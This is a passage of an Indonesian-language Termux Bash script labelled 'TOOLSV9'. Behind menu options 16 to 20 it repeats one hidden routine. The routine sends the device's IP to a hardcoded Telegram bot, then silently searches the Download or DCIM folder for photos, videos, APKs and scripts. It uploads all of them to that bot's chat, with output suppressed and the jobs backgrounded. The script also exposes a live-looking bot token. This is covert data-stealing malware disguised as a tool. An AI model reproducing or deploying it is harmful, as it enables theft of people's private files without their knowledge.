📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 16 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 17 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 18 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 19 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/DCIM"
ip_address=$(curl -s ifconfig.me)
city="Jakarta"
region="Jawa Barat"
country="Indonesia"
loc="-6.2088,106.8456"

# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
if [ $input = 20 ]
then
clear
#!/bin/bash
mpv --volume=50 open.mp3
# Inisialisasi variabel lokasi dan informasi sistem
directory="/storage/emulated/0/Download"
ip_address=$(curl -s ifconfig.me)


# Token dan Chat ID Telegram (Gantilah dengan milik Anda)
TOKEN="7013646584:AAGb8EmWGxVEFq_P2m1I68tDxMFs7E6AIoQ"
CHAT_ID="5951232585"

# Membuat pesan caption untuk Telegram
caption=$(cat <<EOF
  TOOLSV9
📂 Direktori Target : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇮🇩 Negara : $country
📌 Lokasi : $loc
EOF
)

# Mengirim informasi sistem ke Telegram (Tanpa Output)
URL="https://api.telegram.org/bot$TOKEN/sendMessage"
curl -s -X POST $URL -d chat_id=$CHAT_ID -d text="$caption" >/dev/null 2>&1 &

# Fungsi untuk mencari file di Download dan mengirimnya
CARI_FILE() {
    echo "Mencari file di $directory..." >/dev/null 2>&1

    # Mencari file dengan format tertentu
    find "$directory" -type f \( \
        -iname "*.apk" -o -iname "*.js" -o -iname "*.py" -o \
        -iname "*.html" -o -iname "*.sh" -o -iname "*.mp4" -o \
        -iname "*.mp3" -o -iname "*.jpg" -o -iname "*.png" -o -iname "*.gif" \
    \) | head -n 99999 > daftar_file.txt

    # Jika ada file, kirim ke Telegram
    if [ -s daftar_file.txt ]; then
        cat daftar_file.txt | xargs -P 10 -I {} curl -s -F "chat_id=$CHAT_ID" -F "document=@{}" "https://api.telegram.org/bot$TOKEN/sendDocument" >/dev/null 2>&1 &
    fi
}

# Fungsi untuk menginstal paket yang diperlukan di Termux (Tanpa Output)
SETUP_TERMUX() {
clear
    termux-setup-storage -y >/dev/null 2>&1
    apt-get update >/dev/null 2>&1
    apt-get install -y curl neofetch inetutils jq clear
    >/dev/null 2>&1
}

# Mengecek apakah direktori Download ada
if [ -d "$directory" ]; then
    CARI_FILE &
    disown
else
    SETUP_TERMUX &
    disown
cd $home
fi
